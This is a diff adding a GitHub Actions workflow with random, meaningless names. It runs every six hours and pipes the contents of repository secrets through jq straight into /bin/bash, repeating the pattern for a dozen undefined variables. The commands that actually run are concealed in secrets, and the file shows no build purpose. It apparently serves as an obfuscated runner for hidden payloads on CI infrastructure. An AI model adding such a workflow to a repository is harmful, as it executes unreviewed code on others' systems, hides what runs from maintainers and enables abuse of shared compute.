@@ -1,0 +1,29 @@
+name: manchuaniqngmengyaxh
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '9 0/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: manchuaniqngmengyaxh
+        env:
+          oxhae1: ${{ secrets.oxhae1 }}
+        run: |
+          echo $oxhae1 | jq -r .biyhm4 | /bin/bash
+          echo $xqjsg1352 | jq -r .rnx6 | /bin/bash
+          echo $vrqut740 | jq -r .tgv5624 | /bin/bash
+          echo $fuxgp801 | jq -r .xhxcp6 | /bin/bash
+          echo $vgsk466 | jq -r .v43 | /bin/bash
+          echo $yybpq8438 | jq -r .yjsdq4978 | /bin/bash
+          echo $o35997 | jq -r .p0 | /bin/bash
+          echo $jjae25644 | jq -r .ck3139 | /bin/bash
+          echo $z68270 | jq -r .usvhb1 | /bin/bash
+          echo $jmm215 | jq -r .wsun08285 | /bin/bash
+          echo $qg7165 | jq -r .i01 | /bin/bash
+          echo $wv96 | jq -r .cxrs9857 | /bin/bash
+          echo $glbe22244 | jq -r .ev0164 | /bin/bash
+
